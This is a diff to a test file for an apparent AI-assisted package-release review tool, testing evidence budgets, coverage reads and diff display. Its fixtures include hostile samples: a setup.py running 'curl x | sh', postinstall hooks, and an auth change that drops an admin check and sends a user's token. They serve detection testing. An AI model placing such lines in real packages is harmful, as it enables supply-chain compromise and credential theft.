@@ -1,5 +1,16 @@
 import { describe, expect, test } from "vitest";
-import { buildAiReviewPayload, createAiReviewTools } from "../server/lib/ai-review/evidence";
+import {
+  COVERAGE_READ_CHARS,
+  MAX_REQUIRED_EVIDENCE_PATHS,
+  MAX_TOOL_RESPONSE_CHARS,
+  MAX_TOTAL_TOOL_RESPONSE_CHARS,
+  MIN_COVERAGE_READ_SHARE,
+} from "../server/lib/ai-review/contract";
+import {
+  buildAiReviewPayload,
+  createAiReviewSession,
+  createAiReviewTools,
+} from "../server/lib/ai-review/evidence";
 
 const EMPTY_PACKAGE_JSON_DIFF = {
   name: "fixture",
@@ -304,7 +315,11 @@ describe("AI review evidence tools", () => {
   });
 
   test("flags evidence-budget exhaustion so the model submits instead of re-reading", async () => {
-    const bigFiles = ["a.js", "b.js", "c.js", "d.js"].map((path) => file(path, "x".repeat(20_000)));
+    // One file per full read call until the budget is gone, plus one more.
+    const count = Math.ceil(MAX_TOTAL_TOOL_RESPONSE_CHARS / MAX_TOOL_RESPONSE_CHARS) + 1;
+    const bigFiles = Array.from({ length: count }, (_, i) =>
+      file(`f${i}.js`, "x".repeat(MAX_TOOL_RESPONSE_CHARS + 4_000)),
+    );
     const options = {
       ecosystem: "npm",
       files: bigFiles,
@@ -322,14 +337,19 @@ describe("AI review evidence tools", () => {
     };
     const tools = createAiReviewTools(options, () => {});
 
-    const first = await tools.read.execute({ paths: ["a.js"], maxChars: 16_000 });
+    const first = await tools.read.execute({ paths: ["f0.js"], maxChars: MAX_TOOL_RESPONSE_CHARS });
     expect(first.note).toBeUndefined();
-    await tools.read.execute({ paths: ["b.js"], maxChars: 16_000 });
-    const third = await tools.read.execute({ paths: ["c.js"], maxChars: 16_000 });
-    expect(third.remainingEvidenceChars).toBe(0);
-    expect(third.note).toContain("submit_review");
+    let last = first;
+    for (let i = 1; i < count - 1; i += 1) {
+      last = await tools.read.execute({ paths: [`f${i}.js`], maxChars: MAX_TOOL_RESPONSE_CHARS });
+    }
+    expect(last.remainingEvidenceChars).toBe(0);
+    expect(last.note).toContain("submit_review");
 
-    const exhaustedRead = await tools.read.execute({ paths: ["d.js"], maxChars: 16_000 });
+    const exhaustedRead = await tools.read.execute({
+      paths: [`f${count - 1}.js`],
+      maxChars: MAX_TOOL_RESPONSE_CHARS,
+    });
     expect(exhaustedRead.note).toContain("submit_review");
     expect(exhaustedRead.results[0].content).toBe("");
     const exhaustedSearch = await tools.search_files.execute({ queries: ["x"], maxResults: 1 });
@@ -532,22 +552,21 @@ describe("AI review evidence coverage", () => {
 
   test("does not refuse once the evidence budget is exhausted", async () => {
     const options = coverageOptions();
-    options.files.push(file("dist/bundle.js", "x".repeat(60_000)));
-    options.diff.push({ path: "dist/bundle.js", status: "added", stagedSize: 60_000, flags: [] });
+    const size = MAX_TOTAL_TOOL_RESPONSE_CHARS + 10_000;
+    options.files.push(file("dist/bundle.js", "x".repeat(size)));
+    options.diff.push({ path: "dist/bundle.js", status: "added", stagedSize: size, flags: [] });
     const submitted = [];
     const tools = createAiReviewTools(options, (review) => submitted.push(review));
-    let offset = 0;
-    for (let i = 0; i < 4; i += 1) {
-      const reads = await tools.read.execute({
-        paths: ["dist/bundle.js"],
-        maxChars: 16_000,
-        offset,
-      });
-      offset = reads.results[0].nextOffset ?? offset;
+    const before = await tools.read.execute({ paths: ["README.md"], maxChars: 1 });
+    expect(before.unreadRequiredPaths.length).toBeGreaterThan(0);
+    // Without an offset each read continues where the last one stopped.
+    for (let i = 0; i * MAX_TOOL_RESPONSE_CHARS < size; i += 1) {
+      await tools.read.execute({ paths: ["dist/bundle.js"], maxChars: MAX_TOOL_RESPONSE_CHARS });
     }
     const exhausted = await tools.read.execute({ paths: ["README.md"], maxChars: 100 });
     expect(exhausted.remainingEvidenceChars).toBe(0);
-    expect(exhausted.unreadRequiredPaths.length).toBeGreaterThan(0);
+    // Nothing is owed that the budget can no longer pay for.
+    expect(exhausted.unreadRequiredPaths).toEqual([]);
 
     const result = await tools.submit_review.execute({
       risk: "medium",
@@ -668,7 +687,10 @@ describe("AI review evidence coverage", () => {
 
   test("a lifecycle hook naming many files cannot evict the entrypoint or payload", () => {
     const options = coverageOptions();
-    const decoys = Array.from({ length: 14 }, (_, i) => `tools/d${i}.js`);
+    const decoys = Array.from(
+      { length: MAX_REQUIRED_EVIDENCE_PATHS + 10 },
+      (_, i) => `tools/d${String(i).padStart(2, "0")}.js`,
+    );
     options.files.push(...decoys.map((d) => file(d, "ok\n")));
     options.diff.push(...decoys.map((d) => ({ path: d, status: "unchanged", flags: [] })));
     options.packageJsonDiff = {
@@ -677,7 +699,7 @@ describe("AI review evidence coverage", () => {
       scripts: [{ key: "postinstall", status: "modified", staged: `node ${decoys.join(" ")}` }],
     };
     const { requiredEvidencePaths } = buildAiReviewPayload(options);
-    expect(requiredEvidencePaths).toHaveLength(12);
+    expect(requiredEvidencePaths).toHaveLength(MAX_REQUIRED_EVIDENCE_PATHS);
     expect(requiredEvidencePaths).toEqual(
       expect.arrayContaining(["package.json", "lib/loader.js", "native.node", "dist/index.js"]),
     );
@@ -711,10 +733,191 @@ describe("AI review evidence coverage", () => {
     expect(head.unreadRequiredPaths).not.toContain("scripts/install.js");
   });
 
+  test("offers no continuation once the evidence budget is exhausted", async () => {
+    const options = coverageOptions();
+    const size = MAX_TOTAL_TOOL_RESPONSE_CHARS + 4_000;
+    options.files.push(file("dist/bundle.js", "x".repeat(size)));
+    options.diff.push({ path: "dist/bundle.js", status: "added", stagedSize: size, flags: [] });
+    const tools = createAiReviewTools(options, () => {});
+    let last;
+    for (let offset = 0; offset !== null;) {
+      last = (await tools.read.execute({ paths: ["dist/bundle.js"], maxChars: 16_000, offset }))
+        .results[0];
+      offset = last.nextOffset;
+    }
+    expect(last.truncated).toBe(true);
+    expect(last.nextOffset).toBeNull();
+  });
+});
+
+describe("AI review coverage read", () => {
+  function added(path, text) {
+    return { path, status: "added", stagedSize: text.length, flags: [] };
+  }
+
+  function addedRelease(entries, extra = {}) {
+    const files = entries.map(([path, text]) => file(path, text));
+    return {
+      ecosystem: "npm",
+      files,
+      previousFiles: [],
+      diff: entries.map(([path, text]) => added(path, text)),
+      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
+      ruleFindings: [],
+      previousVersionAvailable: false,
+      ...extra,
+    };
+  }
+
+  test("shows every changed file before the first turn, required evidence included", () => {
+    const options = coverageOptions();
+    const session = createAiReviewSession(options, () => {});
+    const calls = session.seedCoverageRead();
+
+    const shown = calls.flatMap((call) => call.output.results.map((result) => result.path));
+    // Every changed file plus the unchanged lifecycle target the release reaches.
+    expect(shown.sort()).toEqual(
+      ["README.md", "lib/loader.js", "native.node", "package.json", "scripts/install.js"].sort(),
+    );
+    expect(calls.at(-1).output.unreadRequiredPaths).toEqual([]);
+    expect(calls[0].toolCallId).toBe("coverage_read_0");
+
+    const coverage = session.coverage();
+    expect(coverage.changedFilesFullyShown).toBe(coverage.changedFiles);
+    expect(coverage.requiredPathsUnread).toBe(0);
+    expect(coverage.coverageReadChars).toBe(coverage.evidenceChars);
+
+    const payload = buildAiReviewPayload(options);
+    expect(payload.coverageRead).toEqual({
+      shownInFull: 5,
+      shownInPart: 0,
+      changedFilesNotShown: 0,
+    });
+    for (const entry of payload.changedFileManifest) {
+      expect(entry.signals).toContain("shown:full");
+    }
+  });
+
+  test("an early submit is accepted once the coverage read has shown the required set", async () => {
+    const submitted = [];
+    const session = createAiReviewSession(coverageOptions(), (review) => submitted.push(review));
+    session.seedCoverageRead();
+    const result = await session.tools.submit_review.execute({
+      risk: "low",
+      releaseAssessment: "nothing_unusual",
+      summary: "fine",
+      findings: [],
+      requiresManualReview: false,
+    });
+    expect(result.ok).toBe(true);
+    expect(submitted).toHaveLength(1);
+  });
+
+  test("water-fills a large release: short files whole, long ones cut to one ceiling", () => {
+    const entries = [
+      ["a-short.js", "short\n"],
+      ...Array.from({ length: 20 }, (_, i) => [
+        `b-long-${String(i).padStart(2, "0")}.js`,
+        "y".repeat(20_000),
+      ]),
+    ];
+    const payload = buildAiReviewPayload(addedRelease(entries));
+    const session = createAiReviewSession(addedRelease(entries), () => {});
+    const results = session.seedCoverageRead().flatMap((call) => call.output.results);
+
+    const short = results.find((result) => result.path === "a-short.js");
+    expect(short.nextOffset).toBeNull();
+    const long = results.filter((result) => result.path.startsWith("b-long"));
+    expect(long).toHaveLength(20);
+    const ceiling = long[0].content.length;
+    for (const result of long) {
+      expect(result.content.length).toBe(ceiling);
+      expect(result.nextOffset).toBe(ceiling);
+    }
+    expect(session.coverage().coverageReadChars).toBeLessThanOrEqual(COVERAGE_READ_CHARS);
+    expect(session.coverage().coverageReadChars).toBeGreaterThan(COVERAGE_READ_CHARS - 20);
+    expect(payload.coverageRead).toEqual({
+      shownInFull: 1,
+      shownInPart: 20,
+      changedFilesNotShown: 0,
+    });
+  });
+
+  test("a huge required file keeps half the budget and the lowest-priority rest drops out", () => {
+    const hook = "z".repeat(4 * COVERAGE_READ_CHARS);
+    const packageJson = JSON.stringify({ name: "f", scripts: { postinstall: "node hook.js" } });
+    const chunks = Array.from({ length: 300 }, (_, i) => [
+      `docs/chunk-${String(i).padStart(3, "0")}.md`,
+      "w".repeat(2_000),
+    ]);
+    const options = addedRelease([["package.json", packageJson], ["hook.js", hook], ...chunks], {
+      packageJsonDiff: {
+        ...EMPTY_PACKAGE_JSON_DIFF,
+        scripts: [{ key: "postinstall", status: "added", staged: "node hook.js" }],
+      },
+    });
+    const session = createAiReviewSession(options, () => {});
+    const results = session.seedCoverageRead().flatMap((call) => call.output.results);
+
+    const hookShown = results.find((result) => result.path === "hook.js");
+    expect(hookShown.content.length).toBeGreaterThanOrEqual(COVERAGE_READ_CHARS / 2 - 100);
+    const shownChunks = results.filter((result) => result.path.startsWith("docs/"));
+    expect(shownChunks.length).toBeGreaterThan(0);
+    expect(shownChunks.length).toBeLessThan(300);
+    for (const chunk of shownChunks) {
+      expect(chunk.content.length).toBeGreaterThanOrEqual(MIN_COVERAGE_READ_SHARE);
+    }
+    // Equal priority falls back to path order, so the dropped files are the tail.
+    expect(shownChunks.at(-1).path < `docs/chunk-299.md`).toBe(true);
+    expect(session.coverage().requiredPathsUnread).toBe(1);
+    expect(buildAiReviewPayload(options).coverageRead.changedFilesNotShown).toBe(
+      300 - shownChunks.length,
+    );
+  });
+
+  test("a read without offset continues where the last one stopped", async () => {
+    const options = addedRelease([["index.js", "q".repeat(5_000)]]);
+    const tools = createAiReviewTools(options, () => {});
+    const first = (await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 })).results[0];
+    expect(first.offset).toBe(0);
+    const second = (await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 })).results[0];
+    expect(second.offset).toBe(2_000);
+    const third = (await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 })).results[0];
+    expect(third.nextOffset).toBeNull();
+
+    const before = (await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 }))
+      .remainingEvidenceChars;
+    const again = await tools.read.execute({ paths: ["index.js"], maxChars: 2_000 });
+    expect(again.results[0].content).toBe("");
+    expect(again.results[0].note).toContain("Already shown in full");
+    expect(again.remainingEvidenceChars).toBe(before);
+  });
+
+  test("a required file counts only once it has been read to the end", async () => {
+    const options = coverageOptions();
+    const body = "fetch('https://example.invalid');\n".repeat(400);
+    options.files = options.files.map((entry) =>
+      entry.path === "scripts/install.js" ? file("scripts/install.js", body) : entry,
+    );
+    const tools = createAiReviewTools(options, () => {});
+    const head = await tools.read.execute({ paths: ["scripts/install.js"], maxChars: 1_000 });
+    expect(head.results[0].nextOffset).toBe(1_000);
+    expect(head.unreadRequiredPaths).toContain("scripts/install.js");
+    // A window past the shown prefix does not count as coverage either.
+    const jump = await tools.read.execute({
+      paths: ["scripts/install.js"],
+      maxChars: 100,
+      offset: 9_000,
+    });
+    expect(jump.unreadRequiredPaths).toContain("scripts/install.js");
+    const rest = await tools.read.execute({ paths: ["scripts/install.js"], maxChars: 16_000 });
+    expect(rest.results[0].offset).toBe(1_000);
+    expect(rest.unreadRequiredPaths).not.toContain("scripts/install.js");
+  });
+
   test("resolves a finding cited under another tree through its alias", async () => {
     const setup = "from setuptools import setup\nimport os\nos.system('curl x | sh')\n";
     const findingFile = "dist/demo-1.2.0.tar.gz/setup.py";
-    const added = (path, text) => ({ path, status: "added", stagedSize: text.length, flags: [] });
     const options = {
       ecosystem: "pypi",
       files: [file("sdist/PKG-INFO", "Name: demo\n"), file("sdist/setup.py", setup)],
@@ -749,18 +952,140 @@ describe("AI review evidence coverage", () => {
     expect(buildAiReviewPayload(options).requiredEvidencePaths).toEqual([]);
   });
 
-  test("offers no continuation once the evidence budget is exhausted", async () => {
-    const options = coverageOptions();
-    options.files.push(file("dist/bundle.js", "x".repeat(60_000)));
-    options.diff.push({ path: "dist/bundle.js", status: "added", stagedSize: 60_000, flags: [] });
-    const tools = createAiReviewTools(options, () => {});
-    let last;
-    for (let offset = 0; offset !== null;) {
-      last = (await tools.read.execute({ paths: ["dist/bundle.js"], maxChars: 16_000, offset }))
-        .results[0];
-      offset = last.nextOffset;
+  test("one diff budget bounds a review; files past it list removed and added lines", () => {
+    const lines = (prefix) => Array.from({ length: 1_200 }, (_, i) => `${prefix}${i}`).join("\n");
+    const paths = Array.from({ length: 30 }, (_, i) => `src/f${String(i).padStart(2, "0")}.js`);
+    const options = {
+      ecosystem: "npm",
+      files: paths.map((path) => file(path, lines("  b"))),
+      previousFiles: paths.map((path) => file(path, lines("a"))),
+      diff: paths.map((path) => ({ path, status: "modified", flags: [] })),
+      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
+      ruleFindings: [],
+      previousVersionAvailable: true,
+    };
+    const session = createAiReviewSession(options, () => {});
+    const results = session.seedCoverageRead().flatMap((call) => call.output.results);
+
+    expect(results).toHaveLength(30);
+    expect(results[0].note).toContain("Too many changed lines");
+    const spent = results.filter((result) => result.note?.includes("budget is spent"));
+    expect(spent.length).toBeGreaterThan(20);
+    for (const result of results) {
+      expect(result.kind).toBe("diff");
+      expect(result.content).toContain("@@ lines only in the previous version @@\n-a0\n");
     }
-    expect(last.truncated).toBe(true);
-    expect(last.nextOffset).toBeNull();
+  });
+
+  test("a budget-burning bundle cannot hide a later file's removed check", async () => {
+    const bundle = (prefix) => Array.from({ length: 2_000 }, (_, i) => `${prefix}${i}`).join("\n");
+    const auth = (body) =>
+      Array.from({ length: 300 }, (_, i) => `const filler${i} = ${i};`).join("\n") + body;
+    const options = {
+      ecosystem: "npm",
+      files: [
+        file("dist/a.js", bundle("new")),
+        file("lib/auth.js", auth("\nexport function act(user) {\n  send(user.token);\n}\n")),
+      ],
+      previousFiles: [
+        file("dist/a.js", bundle("old")),
+        file(
+          "lib/auth.js",
+          auth("\nexport function act(user) {\n  if (!user.isAdmin) throw new Error('no');\n}\n"),
+        ),
+      ],
+      diff: [
+        { path: "dist/a.js", status: "modified", flags: [] },
+        { path: "lib/auth.js", status: "modified", flags: [] },
+      ],
+      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
+      ruleFindings: [],
+      previousVersionAvailable: true,
+    };
+    const tools = createAiReviewTools(options, () => {});
+    const results = (
+      await tools.read.execute({ paths: ["dist/a.js", "lib/auth.js"], maxChars: 8_000 })
+    ).results;
+    const authResult = results.find((result) => result.path === "lib/auth.js");
+    expect(authResult.content).toContain("-  if (!user.isAdmin) throw new Error('no');");
+    expect(authResult.content).toContain("+  send(user.token);");
+  });
+
+  test("a line-ending flip reads as no line change", async () => {
+    const body = Array.from({ length: 2_500 }, (_, i) => `line ${i}`);
+    const options = {
+      ecosystem: "npm",
+      files: [file("crlf.js", body.join("\r\n"))],
+      previousFiles: [file("crlf.js", body.join("\n"))],
+      diff: [{ path: "crlf.js", status: "modified", flags: [] }],
+      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
+      ruleFindings: [],
+      previousVersionAvailable: true,
+    };
+    const tools = createAiReviewTools(options, () => {});
+    const result = (await tools.read.execute({ paths: ["crlf.js"], maxChars: 1_000 })).results[0];
+    expect(result.content).toBe("@@ no line differs except in order or line endings @@\n");
+  });
+
+  test("a required file the budget cannot finish is not owed", async () => {
+    const hook = "z".repeat(MAX_TOTAL_TOOL_RESPONSE_CHARS);
+    const packageJson = JSON.stringify({ name: "f", scripts: { postinstall: "node hook.js" } });
+    const options = addedRelease(
+      [
+        ["package.json", packageJson],
+        ["hook.js", hook],
+      ],
+      {
+        packageJsonDiff: {
+          ...EMPTY_PACKAGE_JSON_DIFF,
+          scripts: [{ key: "postinstall", status: "added", staged: "node hook.js" }],
+        },
+      },
+    );
+    const submitted = [];
+    const session = createAiReviewSession(options, (review) => submitted.push(review));
+    const calls = session.seedCoverageRead();
+    expect(calls.at(-1).output.unreadRequiredPaths).toEqual([]);
+    // Coverage telemetry still counts it as unread.
+    expect(session.coverage().requiredPathsUnread).toBe(1);
+    const result = await session.tools.submit_review.execute({
+      risk: "low",
+      releaseAssessment: "nothing_unusual",
+      summary: "fine",
+      findings: [],
+      requiresManualReview: false,
+    });
+    expect(result.ok).toBe(true);
+  });
+
+  test("offset 0 on a batched read continues each path like an omitted offset", async () => {
+    const options = addedRelease([
+      ["a.js", "a".repeat(3_000)],
+      ["b.js", "b".repeat(3_000)],
+    ]);
+    const tools = createAiReviewTools(options, () => {});
+    await tools.read.execute({ paths: ["a.js", "b.js"], maxChars: 1_000 });
+    const next = await tools.read.execute({ paths: ["a.js", "b.js"], maxChars: 1_000, offset: 0 });
+    expect(next.ok).toBe(true);
+    expect(next.results.map((result) => result.offset)).toEqual([1_000, 1_000]);
+  });
+
+  test("a file too rewritten for a bounded line diff lists its removed and added lines", async () => {
+    const previous = file("gen.js", Array.from({ length: 3_000 }, (_, i) => `a${i}`).join("\n"));
+    const staged = file("gen.js", Array.from({ length: 3_000 }, (_, i) => `b${i}`).join("\n"));
+    const options = {
+      ecosystem: "npm",
+      files: [staged],
+      previousFiles: [previous],
+      diff: [{ path: "gen.js", status: "modified", flags: [] }],
+      packageJsonDiff: EMPTY_PACKAGE_JSON_DIFF,
+      ruleFindings: [],
+      previousVersionAvailable: true,
+    };
+    const tools = createAiReviewTools(options, () => {});
+    const result = (await tools.read.execute({ paths: ["gen.js"], maxChars: 100 })).results[0];
+    expect(result.kind).toBe("diff");
+    expect(result.content.startsWith("@@ lines only in the previous version @@\n-a0\n")).toBe(true);
+    expect(result.note).toContain("Too many changed lines");
   });
 });
